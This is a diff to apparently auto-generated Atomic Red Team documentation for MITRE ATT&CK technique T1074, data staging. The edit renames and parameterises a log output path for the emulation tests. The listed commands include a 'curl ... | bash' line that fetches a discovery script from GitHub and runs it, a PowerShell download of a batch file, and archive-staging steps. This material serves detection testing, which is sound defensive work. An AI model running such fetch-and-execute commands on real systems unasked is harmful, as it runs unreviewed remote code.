@@ -25,7 +25,7 @@ Interactive command shells may be used, and common functionality within [cmd](ht
 ```
 Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat" -OutFile $env:TEMP\discovery.bat
 
-curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/discovery.log
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/T1074_discovery.log
 
 Compress-Archive -Path PathToAtomicsFolder\T1074\bin\Folder_to_zip -DestinationPath #{output_file} -Force
 
@@ -45,7 +45,7 @@ Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\Folder_to_zip.zi
   'source': 'atomics/T1074/T1074.yaml'},
  {'command': 'curl -s '
              'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh '
-             '| bash -s > /tmp/discovery.log\n',
+             '| bash -s > /tmp/T1074_discovery.log\n',
   'name': None,
   'source': 'atomics/T1074/T1074.yaml'},
  {'command': 'Compress-Archive -Path '
@@ -188,8 +188,16 @@ Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\Folder_to_zip.zi
                                                                                    'bash '
                                                                                    '-s '
                                                                                    '> '
-                                                                                   '/tmp/discovery.log\n',
+                                                                                   '#{output_file}\n',
                                                                         'name': 'bash'},
+                                                           'input_arguments': {'output_file': {'default': '/tmp/T1074_discovery.log',
+                                                                                               'description': 'Location '
+                                                                                                              'to '
+                                                                                                              'save '
+                                                                                                              'downloaded '
+                                                                                                              'discovery.bat '
+                                                                                                              'file',
+                                                                                               'type': 'Path'}},
                                                            'name': 'Stage data '
                                                                    'from '
                                                                    'Discovery.sh',
